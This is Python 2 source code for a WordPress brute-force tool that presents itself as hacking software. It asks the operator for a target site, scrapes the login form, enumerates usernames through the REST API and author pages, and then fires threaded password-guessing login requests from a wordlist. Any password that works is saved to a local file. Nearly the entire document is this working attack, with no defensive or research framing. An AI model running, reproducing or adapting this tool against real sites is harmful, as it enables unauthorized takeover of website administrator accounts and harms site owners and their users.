# coding=utf-8
import threading, time, re, os, sys, json, random

try:
    import requests
except ImportError:
    print '---------------------------------------------------'
    print '[*] pip install requests'
    print '   [-] you need to install requests Module'
    sys.exit()

'''
              
         _       __      ____  ____
        | |     / /___  / __ )/ __/
        | | /| / / __ \/ __  / /_
        | |/ |/ / /_/ / /_/ / __/
        |__/|__/ .___/_____/_/
              /_/
        
               Note! : Resiko Ditanggung Sendiri 
'''


class WordPress_priv8Bf(object):
    def __init__(self):
        self.flag = 0
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.cls()
        self.print_logo()
        site = raw_input(self.c + '    [' + self.y + '+' + self.c + '] ' + self.w + ' Target: ' + self.c)
        if site.startswith('http://'):
            site = site.replace('http://', '')
        elif site.startswith('https://'):
            site = site.replace('https://', '')
        else:
            pass
        print self.c + '    [' + self.y + '+' + self.c + '] ' + self.w + ' Memproses WP bruteforce: ' \
              + self.c + site
        try:
            agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            source = requests.get('http://' + site + '/wp-login.php', timeout=5, headers=agent).text.encode('utf-8')
            print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
                  ' [Trying to Get Wp-login.php SourceCode] ' + self.g + ' [MANTEP]'
            time.sleep(0.5)
        except:
            print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
                  ' [ URL Not valid or Timeout! or Your Ip Address Blocked! ]'
            sys.exit()

        try:
            WpSubmitValue = re.findall('class="button button-primary button-large" value="(.*)"', source)[0]
            print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
                  ' [Trying to Get WpSubmit Value From SourceCode] ' + self.g + ' [MANTEP]'
            time.sleep(0.5)

        except:
            print self.c + '       [' + self.y + '-' + self.c + '] ' + self.w + \
                  ' [Trying to Get WpSubmit Value From SourceCode] ' + self.r + ' [KURANG GANS]'
            sys.exit()
        try:
            WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', source)[0]
            print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
                  ' [Trying to Get WpRedirctTo Value From SourceCode] ' + self.g + ' [MANTEP]'
            time.sleep(0.5)

        except:
            print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
                  ' [Trying to Get WpRedirctTo Value From SourceCode] ' + self.r + ' [KURANG GANS]'
            sys.exit()
        if 'Log In' in WpSubmitValue:
            WpSubmitValue = 'Log+In'
        else:
            WpSubmitValue = WpSubmitValue
        usgen = self.UserName_Enumeration(site)
        if usgen != None:
            Username = usgen
            time.sleep(1)
            print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
                  ' Enumeration Username:  ' + self.g + str(Username) + self.g + ' [MANTEP]'
        else:
            try:
                Username = raw_input(self.c + '       [' + self.y + '*' + self.c + ']' + self.w +
                                     ' Username for Start bf: ')
                if Username == '':
                    print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
                          ' [Username] ' + self.r + ' [KURANG GANS]'
                    sys.exit()
            except:
                print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
                      ' [Username] ' + self.r + ' [KURANG GANS]'
                sys.exit()

        try:
            password = raw_input(self.c + '       [' + self.y + '*' + self.c + ']' + self.w + ' input Password list: ')
            with open(password, 'r') as xx:
                passfile = xx.read().splitlines()
            print self.c + '       [' + self.y + '+' + self.c + '] ' + self.g + \
                  str(len(passfile)) + self.c + ' Passwords ditemukan!'
            time.sleep(2)
        except:
            print self.c + '       [' + self.y + '-' + self.c + ']' + self.w + \
                  ' [Password list] ' + self.r + ' [KURANG GANS]'
            sys.exit()

        thread = []

        for passwd in passfile:
            t = threading.Thread(target=self.BruteForce, args=(site, passwd, WpSubmitValue, WpRedirctTo, Username))
            if self.flag == 1:
                break
            else:
                t.start()
                thread.append(t)
                time.sleep(0.08)
        for j in thread:
            j.join()
        if self.flag == 0:
            print self.c + '       [' + self.y + '-' + self.c + '] ' + self.r + site + ' ' \
                  + self.y + 'wordpress' + self.c + ' [Not Vuln]'

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
              WpBruteforce V2
         _       __      ____  ____
        | |     / /___  / __ )/ __/
        | | /| / / __ \/ __  / /_
        | |/ |/ / /_/ / /_/ / __/
        |__/|__/ .___/_____/_/
              /_/
        
        ---------------------------------------------------------------
        |                     Sofware Tools Hacking                   |
        |=============================================================|
        | TELEGRAM         : https://t.me/anonsecteam                 |
        | Website Team     : www.kawainime.my.id       v vv  v        |
        ===============================================================
        
                github.com/caliwyr

             Note! : Resiko Ditanggung Sendiri          
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)

    def UserName_Enumeration(self, site):
        _cun = 1
        Flag = True
        __Check2 = requests.get('http://' + site + '/?author=1', timeout=10)
        try:
            while Flag:
                GG = requests.get('http://' + site + '/wp-json/wp/v2/users/' + str(_cun), timeout=5)
                __InFo = json.loads(GG.text)
                if 'id' not in __InFo:
                    Flag = False
                else:
                    Usernamez = __InFo['slug']
                    return str(Usernamez).encode('utf-8')
                break
        except:
            try:
                if '/author/' not in __Check2.text:
                    return None
                else:
                    find = re.findall('/author/(.*)/"', __Check2.text)
                    username = find[0]
                    if '/feed' in username:
                        find = re.findall('/author/(.*)/feed/"', __Check2.text)
                        username2 = find[0]
                        return username2.encode('utf-8')
                    else:
                        return username.encode('utf-8')
            except requests.exceptions.ReadTimeout:
                return None

    def BruteForce(self, site, passwd, WpSubmitValue, WpRedirctTo, Username):
        agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        post = {}
        post['log'] = Username
        post['pwd'] = passwd
        post['wp-submit'] = WpSubmitValue
        post['redirect_to'] = WpRedirctTo
        post['testcookie'] = 1
        url = "http://" + site + '/wp-login.php'
        GoT = requests.post(url, data=post, headers=agent, timeout=10)
        print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
              ' Testing n24: ' + self.y + passwd
        if 'wordpress_logged_in_' in str(GoT.cookies):
            print self.c + '       [' + self.y + '+' + self.c + '] ' + \
                  self.y + site + ' ' + self.y + 'username: ' + self.g \
                  + Username + self.y + ' Password: ' + self.g + passwd
            with open('user.txt', 'a') as writer:
                writer.write('http://' + site + '/wp-login.php' + '\n Username: admin' + '\n Password: ' +
                             passwd + '\n-----------------------------------------\n')
            self.flag = 1


WordPress_priv8Bf()
